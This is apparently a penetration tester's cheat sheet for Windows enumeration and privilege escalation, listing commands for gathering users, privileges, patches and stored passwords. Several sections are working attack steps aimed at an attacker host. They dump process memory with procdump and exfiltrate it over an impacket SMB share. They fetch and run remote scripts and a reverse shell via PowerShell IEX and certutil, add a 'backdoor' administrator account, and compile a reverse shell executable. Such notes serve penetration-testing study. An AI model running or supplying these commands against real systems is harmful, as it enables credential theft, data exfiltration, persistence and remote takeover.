# Windows Enumeration

## If the host is running a webapp

	Go look at the webapp dir to find configs and he code
	Go look at the database
	Look at the configs of the other apps running: ftp, mails, etc
	Search users home with:
		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg
		get-childitem -recurse -force -include *.txt,*.ini,*.xml,*,json,*.cfg | select-string password

## Basic System Information

	echo %USERNAME%		Print current user
	whoami /priv		Displays current user privileges
		Interesting Privileges:
			SeDebugPrivilege
			SeTakeOwnership
			SeBackupPrivilege
				https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
			SeLoadDriverPrivilege
			Se Impersonate and SeAssignPrimaryToken
				https://github.com/ohpe/juicy-potato
	whoami /priv in cmd as admin
	whoami /groups		Displays current user groups
		Interesting Groups:
			Backup Operators
			Event Log Readers
			DnsAdmins
			Server Operators
	whoami /groups in cmd as admin
	whoami /all
	echo %PROCESSOR_ARCHITECTURE%
	net user		Print all users
	net localgroup		Print all groups
	net localgroup administrators
	net localgroup <groupname>		Prints information of group
	tasklist /svc		Gives a better idea of what applications are running on the system. Prints the name of executables and services running
		https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist

	set		Prints env variables including PATH
	
	wmic product get name		Get installed programs
		or using powershell
		Get-WmiObject -Class Win32_Product |  select Name, Version

	netstat -ano		Display active tcp and udp connections
	query user		Display active users
	net accounts		Prints password policy

	get-process		Enumerates running processes

		Use procdump https://learn.microsoft.com/en-us/sysinternals/downloads/procdump , to dump the memory of any interesting running process

			.\procdump.exe -ma <process_id> <output_file>
		
		We can use an smb share to download the output_file in cmd:

			on our local machine we do

			smbserver.py -smb2support -username guest -password guest share <path_to_folder_we_gonna_share>

			smbserver is a script from impacket

			on the remote machine we do

			net use x: \\<our_local_ip>\share /user:guest guest #

			and now we copy the dump file

			cmd /c "copy <filen_name>.dmp X:\"

		We can do the same in powershell:

			impacket-smbserver.py -smb2support share <path_to_folder_we_want_to_share>

			in powershell

			New-PSDrive -Name Exfil -PSProvider -FileSystem -Root "\\10.10.14.8\share"

			then copy the file
			
			copy users.db exfil:

Get process information by pid:

	Get-WmiObject Win32_Process -Filter "ProcessId = <PID>"
	Get-Process -Id <PID>

	cmdkey /list	Lists stored credentials

## Gather Network Information

	ipconfig /all
	arp -a
	route print

## Enumerate Protections

	Get-MpComputerStatus
	Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
	Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone 		Tests Applocker policy


## System info

Check if Windows version has any known vulnerability (also check the patches applied)

		https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix
		systeminfo #Prints information of the system, including hotfixes applied
		systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information

		If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.

		wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
		wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture

		[System.Environment]::OSVersion.Version #Current OS version
		Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
		Get-HotFix | ft -AutoSize
		Get-Hotfix -description "Security update" #List only "Security Update" patches


## Search for passwords

	reg query HKLM /f password /t REG_SZ /s
	reg query HKCU /f password /t REG_SZ /s

## Check communication through processess using pipes

	pipelist.exe /accepteula		enumerate instances of named pipes
		https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist
	Get-ChildItem \\.\pipe\		enumerate instances of named pipes with powershell
	accesschk.exe /accepteula \\.\Pipe\<name_of_pipe> -v		Enumerate permissions of pipe. We are looking for a pipe we have WRITE permissions for our user
		https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk
	accesschk.exe -w \pipe\* -v		Enumerates all pipes that have WRITE permission
	Use powersploit powerup to check miss configurations
		https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
		IEX(New-Object Net-WebClient).downloadString("http://myhostwiththescript/PowerUp.ps1")
		Then run is ps:
		Invoke-AllChecks


## Check weak permission

	Use the sharpup too to check service binaries suffering from weak ACLS

		SharpUP.exe audit
			https://github.com/GhostPack/SharpUp/
	Check permissions using icacls
		https://ss64.com/nt/icacls.html


## If we are in a Active Directory Environment

	Use snaffler to search for credentials.

## Remote Login with username and password

We can try doing remote logins with useranmes and passwords using a script from impacket

	psexec.py '<username>:<password>@<remote_host_ip>'

Use impacket-wmiexec with rpc port 135:

	https://github.com/Andre92Marcos/tools/blob/master/impacket/wmiexec.md


## Try WinPeas

	https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS


## Other Info

Download and execute file using powershell:

	powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<localhostip>/rev_shell")'

Download file:

	certutil.exe -urlcache -f http://<localhostip>/rev_shell <path_to_where_file_is_gonna_be_saved>

Good dir to save, download and write files:

	C:\Users\Public\

Add backdoor account as admin user:

	net user /add backdoor Password1
	net localgroup administrators /add backdoor

	Confirm that it has been added: net locagroup administrators


## Payloads

Use https://github.com/Andre92Marcos/myScripts/blob/main/rev_shell_exe.c to generate a reverse shell exe:

	x86_64-w64-mingw32-gcc rev_shell_exe.c -o rev_shell.exe

## More info

	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
	https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation
